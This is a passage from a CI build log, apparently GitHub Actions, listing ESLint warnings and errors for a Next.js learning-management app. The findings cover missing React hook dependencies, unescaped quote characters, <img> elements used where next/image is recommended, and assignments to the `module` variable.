2025-11-18T17:35:22.2324970Z /home/runner/work/fne-lms/fne-lms/components/quotes/QuotePublicView.tsx
2025-11-18T17:35:22.2328884Z ##[warning]  523:13  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2334819Z ##[warning]  901:15  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2337520Z 
2025-11-18T17:35:22.2338027Z /home/runner/work/fne-lms/fne-lms/components/reports/AdvancedFilters.tsx
2025-11-18T17:35:22.2339542Z ##[error]  237:20  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2341800Z ##[error]  237:37  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2343161Z 
2025-11-18T17:35:22.2343682Z /home/runner/work/fne-lms/fne-lms/components/reports/AnalyticsDashboard.tsx
2025-11-18T17:35:22.2345911Z ##[warning]  117:6  warning  React Hook useEffect has a missing dependency: 'fetchAnalyticsData'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2347889Z 
2025-11-18T17:35:22.2348388Z /home/runner/work/fne-lms/fne-lms/components/reports/AnalyticsVisualization.tsx
2025-11-18T17:35:22.2350409Z ##[warning]  87:6  warning  React Hook useEffect has a missing dependency: 'fetchAnalyticsData'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2351963Z 
2025-11-18T17:35:22.2352436Z /home/runner/work/fne-lms/fne-lms/components/reports/LearningPathAnalytics.tsx
2025-11-18T17:35:22.2354481Z ##[warning]  73:6  warning  React Hook useEffect has a missing dependency: 'fetchAnalytics'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2356178Z 
2025-11-18T17:35:22.2356649Z /home/runner/work/fne-lms/fne-lms/components/reports/UserDetailModal.tsx
2025-11-18T17:35:22.2358969Z ##[warning]  134:6  warning  React Hook useEffect has a missing dependency: 'fetchUserDetails'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2360731Z 
2025-11-18T17:35:22.2361268Z /home/runner/work/fne-lms/fne-lms/components/student/StudentBlockRenderer.tsx
2025-11-18T17:35:22.2364774Z ##[warning]  391:17  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2369851Z ##[warning]  444:25  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2373949Z ##[warning]  924:25  warning  Image elements must have an alt prop, either with meaningful text, or an empty string for decorative images                                                                                                                                                     jsx-a11y/alt-text
2025-11-18T17:35:22.2378661Z ##[warning]  978:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2381148Z 
2025-11-18T17:35:22.2381634Z /home/runner/work/fne-lms/fne-lms/components/transformation/DimensionCard.tsx
2025-11-18T17:35:22.2383066Z ##[error]  151:66  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2385125Z ##[error]  151:97  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2386346Z 
2025-11-18T17:35:22.2387081Z /home/runner/work/fne-lms/fne-lms/components/transformation/PreAssessmentQuestions.tsx
2025-11-18T17:35:22.2389134Z ##[warning]  73:6  warning  React Hook useEffect has a missing dependency: 'getAnsweredCount'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2390934Z 
2025-11-18T17:35:22.2391499Z /home/runner/work/fne-lms/fne-lms/components/workspace/SimplifiedGroupAssignments.tsx
2025-11-18T17:35:22.2393707Z ##[warning]  44:6  warning  React Hook useEffect has a missing dependency: 'loadGroupAssignments'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2395278Z 
2025-11-18T17:35:22.2395623Z /home/runner/work/fne-lms/fne-lms/contexts/AuthContext.tsx
2025-11-18T17:35:22.2397647Z ##[warning]  170:6  warning  React Hook useEffect has a missing dependency: 'session.user'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2399210Z 
2025-11-18T17:35:22.2399574Z /home/runner/work/fne-lms/fne-lms/contexts/AvatarContext.tsx
2025-11-18T17:35:22.2401781Z ##[warning]  151:6  warning  React Hook useEffect has missing dependencies: 'fetchAvatar', 'supabase', 'updateAvatarUrl', and 'user'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2403531Z 
2025-11-18T17:35:22.2403954Z /home/runner/work/fne-lms/fne-lms/contexts/PermissionContext.tsx
2025-11-18T17:35:22.2406052Z ##[warning]  131:6  warning  React Hook useEffect has a missing dependency: 'fetchPermissions'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2407948Z 
2025-11-18T17:35:22.2408349Z /home/runner/work/fne-lms/fne-lms/e2e/course-structure.spec.ts
2025-11-18T17:35:22.2410345Z ##[error]  276:12  error  Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable  @next/next/no-assign-module-variable
2025-11-18T17:35:22.2411994Z 
2025-11-18T17:35:22.2412354Z /home/runner/work/fne-lms/fne-lms/hooks/useAuthEnhanced.ts
2025-11-18T17:35:22.2414735Z ##[warning]  139:6  warning  React Hook useCallback has a missing dependency: 'retryOperation'. Either include it or remove the dependency array                              react-hooks/exhaustive-deps
2025-11-18T17:35:22.2418635Z ##[warning]  295:6  warning  React Hook useCallback has missing dependencies: 'retryOperation' and 'startPeriodicChecks'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2420507Z 
2025-11-18T17:35:22.2420821Z /home/runner/work/fne-lms/fne-lms/hooks/useAvatar.ts
2025-11-18T17:35:22.2422557Z ##[warning]  74:6  warning  React Hook useEffect has a missing dependency: 'user'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2424146Z 
2025-11-18T17:35:22.2424527Z /home/runner/work/fne-lms/fne-lms/hooks/useFiltersUrlState.ts
2025-11-18T17:35:22.2426410Z ##[warning]  105:6  warning  React Hook useEffect has a missing dependency: 'isUpdating'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2428195Z 
2025-11-18T17:35:22.2428581Z /home/runner/work/fne-lms/fne-lms/lib/frontend-auth-utils.ts
2025-11-18T17:35:22.2430808Z ##[warning]  126:6   warning  React Hook useEffect has a missing dependency: 'requireRole'. Either include it or remove the dependency array                            react-hooks/exhaustive-deps
2025-11-18T17:35:22.2434483Z ##[warning]  126:79  warning  React Hook useEffect has a complex expression in the dependency array. Extract it to a separate variable so it can be statically checked  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2436224Z 
2025-11-18T17:35:22.2436599Z /home/runner/work/fne-lms/fne-lms/lib/notificationService.ts
2025-11-18T17:35:22.2438216Z ##[warning]  805:1  warning  Assign instance to a variable before exporting as module default  import/no-anonymous-default-export
2025-11-18T17:35:22.2439669Z 
2025-11-18T17:35:22.2440069Z /home/runner/work/fne-lms/fne-lms/lib/realtimeNotifications.js
2025-11-18T17:35:22.2442141Z ##[warning]  193:6  warning  React Hook useEffect has a missing dependency: 'unreadCount'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2443890Z 
2025-11-18T17:35:22.2444450Z /home/runner/work/fne-lms/fne-lms/lib/services/reports.js
2025-11-18T17:35:22.2446197Z ##[warning]  464:1  warning  Assign instance to a variable before exporting as module default  import/no-anonymous-default-export
2025-11-18T17:35:22.2448028Z 
2025-11-18T17:35:22.2448554Z /home/runner/work/fne-lms/fne-lms/pages/admin/apply-network-migration.tsx
2025-11-18T17:35:22.2450243Z ##[error]  118:74   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2452533Z ##[error]  118:85   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2454723Z ##[error]  147:85   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2457016Z ##[error]  147:108  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2459256Z ##[error]  150:80   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2461441Z ##[error]  150:87   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2463606Z ##[error]  153:43   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2465683Z ##[error]  153:80   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2467888Z ##[error]  165:35   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2469908Z ##[error]  165:65   error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2471126Z 
2025-11-18T17:35:22.2471620Z /home/runner/work/fne-lms/fne-lms/pages/admin/assignment-overview.tsx
2025-11-18T17:35:22.2474043Z ##[warning]   85:6  warning  React Hook useEffect has a missing dependency: 'checkAuth'. Either include it or remove the dependency array                                                  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2478040Z ##[warning]   91:6  warning  React Hook useEffect has a missing dependency: 'loadInitialData'. Either include it or remove the dependency array                                            react-hooks/exhaustive-deps
2025-11-18T17:35:22.2481914Z ##[warning]   97:6  warning  React Hook useEffect has a missing dependency: 'loadAssignments'. Either include it or remove the dependency array                                            react-hooks/exhaustive-deps
2025-11-18T17:35:22.2486063Z ##[warning]  107:6  warning  React Hook useEffect has missing dependencies: 'loadCommunitiesForSchool' and 'loadGenerationsForSchool'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2488316Z 
2025-11-18T17:35:22.2488815Z /home/runner/work/fne-lms/fne-lms/pages/admin/assignment-review/[id].tsx
2025-11-18T17:35:22.2491404Z ##[warning]  75:6  warning  React Hook useEffect has missing dependencies: 'checkAuth' and 'router'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2493241Z 
2025-11-18T17:35:22.2493660Z /home/runner/work/fne-lms/fne-lms/pages/admin/bucket-test.tsx
2025-11-18T17:35:22.2496087Z ##[warning]  65:6  warning  React Hook useEffect has missing dependencies: 'bucketNames' and 'supabase.storage'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2498180Z 
2025-11-18T17:35:22.2498559Z /home/runner/work/fne-lms/fne-lms/pages/admin/clients.tsx
2025-11-18T17:35:22.2500589Z ##[warning]  70:6  warning  React Hook useEffect has a missing dependency: 'checkAuth'. Either include it or remove the dependency array      react-hooks/exhaustive-deps
2025-11-18T17:35:22.2504192Z ##[warning]  76:6  warning  React Hook useEffect has a missing dependency: 'fetchClientes'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2506004Z 
2025-11-18T17:35:22.2506443Z /home/runner/work/fne-lms/fne-lms/pages/admin/configuration.tsx
2025-11-18T17:35:22.2509058Z ##[warning]  52:6  warning  React Hook useEffect has a missing dependency: 'checkUserAuth'. Either include it or remove the dependency array                                            react-hooks/exhaustive-deps
2025-11-18T17:35:22.2513195Z ##[warning]  60:6  warning  React Hook useEffect has missing dependencies: 'fetchNotificationTypes' and 'notificationTypes.length'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2515347Z 
2025-11-18T17:35:22.2515851Z /home/runner/work/fne-lms/fne-lms/pages/admin/consultant-assignments.tsx
2025-11-18T17:35:22.2518186Z ##[warning]   98:6  warning  React Hook useEffect has a missing dependency: 'initializeAuth'. Either include it or remove the dependency array    react-hooks/exhaustive-deps
2025-11-18T17:35:22.2521656Z ##[warning]  104:6  warning  React Hook useEffect has a missing dependency: 'fetchAssignments'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2523465Z 
2025-11-18T17:35:22.2524163Z /home/runner/work/fne-lms/fne-lms/pages/admin/course-builder/[courseId]/[moduleId]/[lessonId].tsx
2025-11-18T17:35:22.2528094Z ##[warning]  178:6  warning  React Hook useEffect has missing dependencies: 'courseId', 'initialLessonData.blocks', 'lessonIdString', and 'moduleId'. Either include them or remove the dependency array                                                                                                   react-hooks/exhaustive-deps
2025-11-18T17:35:22.2534060Z ##[warning]  460:6  warning  React Hook useCallback has missing dependencies: 'collapsedBlocks' and 'initialLessonData.module_id'. Either include them or remove the dependency array. Outer scope values like 'supabase' aren't valid dependencies because mutating them doesn't re-render the component  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2536944Z 
2025-11-18T17:35:22.2537609Z /home/runner/work/fne-lms/fne-lms/pages/admin/course-builder/[courseId]/[moduleId]/index.tsx
2025-11-18T17:35:22.2539763Z ##[warning]  215:6  warning  React Hook useEffect has a missing dependency: 'router'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2541475Z 
2025-11-18T17:35:22.2542027Z /home/runner/work/fne-lms/fne-lms/pages/admin/course-builder/[courseId]/edit.tsx
2025-11-18T17:35:22.2544974Z ##[warning]  164:6   warning  React Hook useEffect has missing dependencies: 'fetchInstructors' and 'supabase'. Either include them or remove the dependency array                                                                                                                            react-hooks/exhaustive-deps
2025-11-18T17:35:22.2550347Z ##[warning]  604:23  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2556281Z ##[warning]  637:23  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2558936Z 
2025-11-18T17:35:22.2559497Z /home/runner/work/fne-lms/fne-lms/pages/admin/course-builder/[courseId]/index.tsx
2025-11-18T17:35:22.2561578Z ##[warning]  114:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2563284Z 
2025-11-18T17:35:22.2563773Z /home/runner/work/fne-lms/fne-lms/pages/admin/course-builder/index.tsx
2025-11-18T17:35:22.2566582Z ##[warning]  108:6   warning  React Hook useCallback has a missing dependency: 'supabase'. Either include it or remove the dependency array                                                                                                                                                   react-hooks/exhaustive-deps
2025-11-18T17:35:22.2570886Z ##[warning]  123:6   warning  React Hook useEffect has a missing dependency: 'supabase.auth'. Either include it or remove the dependency array                                                                                                                                                react-hooks/exhaustive-deps
2025-11-18T17:35:22.2575066Z ##[warning]  210:6   warning  React Hook useCallback has missing dependencies: 'supabase' and 'user'. Either include them or remove the dependency array                                                                                                                                      react-hooks/exhaustive-deps
2025-11-18T17:35:22.2579265Z ##[warning]  223:6   warning  React Hook useEffect has a missing dependency: 'user'. Either include it or remove the dependency array                                                                                                                                                         react-hooks/exhaustive-deps
2025-11-18T17:35:22.2584259Z ##[warning]  567:25  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2586718Z 
2025-11-18T17:35:22.2587356Z /home/runner/work/fne-lms/fne-lms/pages/admin/course-builder/new.tsx
2025-11-18T17:35:22.2590047Z ##[warning]  94:6  warning  React Hook useEffect has missing dependencies: 'fetchInstructors' and 'supabase'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2591972Z 
2025-11-18T17:35:22.2592475Z /home/runner/work/fne-lms/fne-lms/pages/admin/debug/course-module-ids.tsx
2025-11-18T17:35:22.2596216Z ##[warning]   15:13  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2601213Z ##[warning]  118:6   warning  React Hook useEffect has a missing dependency: 'fetchCoursesAndModules'. Either include it or remove the dependency array                                                                                                                                       react-hooks/exhaustive-deps
2025-11-18T17:35:22.2603199Z 
2025-11-18T17:35:22.2603584Z /home/runner/work/fne-lms/fne-lms/pages/admin/debug/ids.tsx
2025-11-18T17:35:22.2605745Z ##[warning]  41:6  warning  React Hook useEffect has a missing dependency: 'fetchCoursesAndModules'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2608138Z 
2025-11-18T17:35:22.2608513Z /home/runner/work/fne-lms/fne-lms/pages/admin/events.tsx
2025-11-18T17:35:22.2610617Z ##[warning]   51:6   warning  React Hook useEffect has a missing dependency: 'checkAuthorization'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2614061Z ##[warning]   57:6   warning  React Hook useEffect has a missing dependency: 'fetchEvents'. Either include it or remove the dependency array         react-hooks/exhaustive-deps
2025-11-18T17:35:22.2617196Z ##[error]  384:23  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                        react/no-unescaped-entities
2025-11-18T17:35:22.2619946Z ##[error]  384:75  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                        react/no-unescaped-entities
2025-11-18T17:35:22.2621405Z 
2025-11-18T17:35:22.2622017Z /home/runner/work/fne-lms/fne-lms/pages/admin/feedback.tsx
2025-11-18T17:35:22.2624268Z ##[warning]  79:6  warning  React Hook useEffect has a missing dependency: 'checkUserAndLoadData'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2627963Z ##[warning]  83:6  warning  React Hook useEffect has a missing dependency: 'applyFilters'. Either include it or remove the dependency array          react-hooks/exhaustive-deps
2025-11-18T17:35:22.2629734Z 
2025-11-18T17:35:22.2630146Z /home/runner/work/fne-lms/fne-lms/pages/admin/form-usage.tsx
2025-11-18T17:35:22.2632206Z ##[warning]  30:6  warning  React Hook useEffect has a missing dependency: 'checkAdminAndLoadStats'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2634113Z 
2025-11-18T17:35:22.2634577Z /home/runner/work/fne-lms/fne-lms/pages/admin/learning-paths.tsx
2025-11-18T17:35:22.2636992Z ##[warning]  37:6  warning  React Hook useEffect has a missing dependency: 'checkAuthAndLoadData'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2639026Z 
2025-11-18T17:35:22.2639519Z /home/runner/work/fne-lms/fne-lms/pages/admin/learning-paths/[id]/assign.tsx
2025-11-18T17:35:22.2641890Z ##[warning]   86:6  warning  React Hook useEffect has a missing dependency: 'checkAuthAndLoadPath'. Either include it or remove the dependency array                         react-hooks/exhaustive-deps
2025-11-18T17:35:22.2645196Z ##[warning]   94:6  warning  React Hook useEffect has a missing dependency: 'searchAssignees'. Either include it or remove the dependency array                              react-hooks/exhaustive-deps
2025-11-18T17:35:22.2648903Z ##[warning]  102:6  warning  React Hook useEffect has a missing dependency: 'searchAssignees'. Either include it or remove the dependency array                              react-hooks/exhaustive-deps
2025-11-18T17:35:22.2652691Z ##[warning]  112:6  warning  React Hook useEffect has missing dependencies: 'debouncedUserQuery' and 'searchAssignees'. Either include them or remove the dependency array   react-hooks/exhaustive-deps
2025-11-18T17:35:22.2656669Z ##[warning]  121:6  warning  React Hook useEffect has missing dependencies: 'debouncedGroupQuery' and 'searchAssignees'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2660905Z ##[warning]  294:6  warning  React Hook useCallback has a missing dependency: 'searchAssignees'. Either include it or remove the dependency array                            react-hooks/exhaustive-deps
2025-11-18T17:35:22.2662792Z 
2025-11-18T17:35:22.2663301Z /home/runner/work/fne-lms/fne-lms/pages/admin/learning-paths/[id]/edit.tsx
2025-11-18T17:35:22.2665568Z ##[warning]  50:6  warning  React Hook useEffect has a missing dependency: 'checkAuthAndLoadData'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2667779Z 
2025-11-18T17:35:22.2668195Z /home/runner/work/fne-lms/fne-lms/pages/admin/learning-paths/new.tsx
2025-11-18T17:35:22.2669969Z ##[warning]  48:6  warning  React Hook useEffect has a missing dependency: 'checkAuthAndLoadCourses'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2671435Z 
2025-11-18T17:35:22.2671861Z /home/runner/work/fne-lms/fne-lms/pages/admin/network-management.tsx
2025-11-18T17:35:22.2674080Z ##[warning]   113:6   warning  React Hook useEffect has a missing dependency: 'initializeAuth'. Either include it or remove the dependency array                                                                    react-hooks/exhaustive-deps
2025-11-18T17:35:22.2678272Z ##[warning]   119:6   warning  React Hook useEffect has a missing dependency: 'fetchNetworks'. Either include it or remove the dependency array                                                                     react-hooks/exhaustive-deps
2025-11-18T17:35:22.2682665Z ##[error]   686:19  error    Do not use an `<a>` element to navigate to `/admin/apply-network-migration/`. Use `<Link />` from `next/link` instead. See: https://nextjs.org/docs/messages/no-html-link-for-pages  @next/next/no-html-link-for-pages
2025-11-18T17:35:22.2686004Z ##[error]  1004:34  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2688917Z ##[error]  1004:57  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2691638Z ##[error]  1104:36  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2694329Z ##[error]  1104:59  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2697136Z ##[error]  1170:60  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2699828Z ##[error]  1170:83  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2701285Z 
2025-11-18T17:35:22.2701635Z /home/runner/work/fne-lms/fne-lms/pages/admin/news.tsx
2025-11-18T17:35:22.2705184Z ##[warning]  353:29  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2710969Z ##[warning]  522:27  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2713398Z 
2025-11-18T17:35:22.2713843Z /home/runner/work/fne-lms/fne-lms/pages/admin/quotes/[id]/edit.tsx
2025-11-18T17:35:22.2716122Z ##[warning]  21:6  warning  React Hook useEffect has a missing dependency: 'fetchQuote'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2718151Z 
2025-11-18T17:35:22.2718571Z /home/runner/work/fne-lms/fne-lms/pages/admin/quotes/index.tsx
2025-11-18T17:35:22.2720856Z ##[warning]  43:6  warning  React Hook useEffect has a missing dependency: 'fetchQuotes'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2722571Z 
2025-11-18T17:35:22.2722999Z /home/runner/work/fne-lms/fne-lms/pages/admin/role-management.tsx
2025-11-18T17:35:22.2725401Z ##[warning]  191:6    warning  React Hook useEffect has missing dependencies: 'checkAccess', 'fetchUserProfile', and 'router'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2728652Z ##[error]  612:138  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                     react/no-unescaped-entities
2025-11-18T17:35:22.2731230Z ##[error]  612:154  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                                                     react/no-unescaped-entities
2025-11-18T17:35:22.2732678Z 
2025-11-18T17:35:22.2733223Z /home/runner/work/fne-lms/fne-lms/pages/admin/schools.tsx
2025-11-18T17:35:22.2735406Z ##[warning]  137:6  warning  React Hook useEffect has a missing dependency: 'checkAuth'. Either include it or remove the dependency array                           react-hooks/exhaustive-deps
2025-11-18T17:35:22.2739242Z ##[warning]  144:6  warning  React Hook useEffect has missing dependencies: 'fetchClientes' and 'fetchSchools'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2741106Z 
2025-11-18T17:35:22.2741530Z /home/runner/work/fne-lms/fne-lms/pages/admin/transformation.tsx
2025-11-18T17:35:22.2743574Z ##[warning]   33:6   warning  React Hook useEffect has a missing dependency: 'checkAuth'. Either include it or remove the dependency array         react-hooks/exhaustive-deps
2025-11-18T17:35:22.2747119Z ##[warning]   39:6   warning  React Hook useEffect has a missing dependency: 'fetchCommunities'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2750019Z ##[error]  236:42  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2752542Z ##[error]  236:58  error    `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`                                                      react/no-unescaped-entities
2025-11-18T17:35:22.2753955Z 
2025-11-18T17:35:22.2754406Z /home/runner/work/fne-lms/fne-lms/pages/admin/user-management.tsx
2025-11-18T17:35:22.2756374Z ##[warning]  380:6  warning  React Hook useEffect has a missing dependency: 'supabase'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2758383Z 
2025-11-18T17:35:22.2758847Z /home/runner/work/fne-lms/fne-lms/pages/api/reports/user-details.ts
2025-11-18T17:35:22.2761045Z ##[error]  292:5  error  Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable  @next/next/no-assign-module-variable
2025-11-18T17:35:22.2764269Z ##[error]  369:5  error  Do not assign to the variable `module`. See: https://nextjs.org/docs/messages/no-assign-module-variable  @next/next/no-assign-module-variable
2025-11-18T17:35:22.2765977Z 
2025-11-18T17:35:22.2766344Z /home/runner/work/fne-lms/fne-lms/pages/assignments.tsx
2025-11-18T17:35:22.2770061Z ##[warning]  170:15  warning  Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element
2025-11-18T17:35:22.2772527Z 
2025-11-18T17:35:22.2772972Z /home/runner/work/fne-lms/fne-lms/pages/assignments/[id]/index.tsx
2025-11-18T17:35:22.2775668Z ##[warning]  74:6  warning  React Hook useEffect has missing dependencies: 'loadAssignmentAndSubmission' and 'supabase'. Either include them or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2778163Z 
2025-11-18T17:35:22.2778651Z /home/runner/work/fne-lms/fne-lms/pages/assignments/[id]/submissions.tsx
2025-11-18T17:35:22.2781036Z ##[warning]  211:6  warning  React Hook useEffect has a missing dependency: 'loadAssignmentAndSubmissions'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2782886Z 
2025-11-18T17:35:22.2783243Z /home/runner/work/fne-lms/fne-lms/pages/auth-status.tsx
2025-11-18T17:35:22.2784475Z ##[error]  153:48  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2786675Z ##[error]  153:74  error  `"` can be escaped with `&quot;`, `&ldquo;`, `&#34;`, `&rdquo;`  react/no-unescaped-entities
2025-11-18T17:35:22.2788324Z 
2025-11-18T17:35:22.2788722Z /home/runner/work/fne-lms/fne-lms/pages/change-password.tsx
2025-11-18T17:35:22.2790917Z ##[warning]  27:6  warning  React Hook useEffect has a missing dependency: 'checkAuth'. Either include it or remove the dependency array  react-hooks/exhaustive-deps
2025-11-18T17:35:22.2792638Z 
